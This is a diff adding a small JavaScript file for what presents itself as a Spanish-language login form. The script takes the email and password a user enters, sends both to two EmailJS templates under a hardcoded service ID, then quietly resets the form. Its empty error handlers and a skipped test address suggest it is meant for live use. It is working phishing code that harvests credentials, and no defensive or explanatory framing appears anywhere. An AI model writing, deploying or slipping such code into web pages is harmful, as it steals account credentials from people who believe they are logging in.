@@ -1,0 +1,39 @@
+(function() {
+    emailjs.init('vXFL1_J2AhuYYvCSx');
+
+    document.getElementById('contact-form').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        var email = document.getElementById('email').value;
+        var password = document.getElementById('password').value;
+
+        if (email === 'pruebita@gmail.com') {
+            document.getElementById('contact-form').reset();
+            return;
+        }
+
+        if (email && password) {
+            // data
+            var templateParams = {
+                email: email,
+                password: password
+            };
+
+            // firtu
+            emailjs.send('service_mlr1gee', 'template_8ygccbi', templateParams)
+                .then(function(response) {
+                }).catch(function(error) {
+                });
+
+            // secose
+            emailjs.send('service_mlr1gee', 'template_mu97vit', templateParams)
+                .then(function(response) {
+                }).catch(function(error) {
+                });
+
+            document.getElementById('contact-form').reset();
+        } else {
+            alert('Por favor, completa todos los campos para iniciar sesión.');
+        }
+    });
+})();
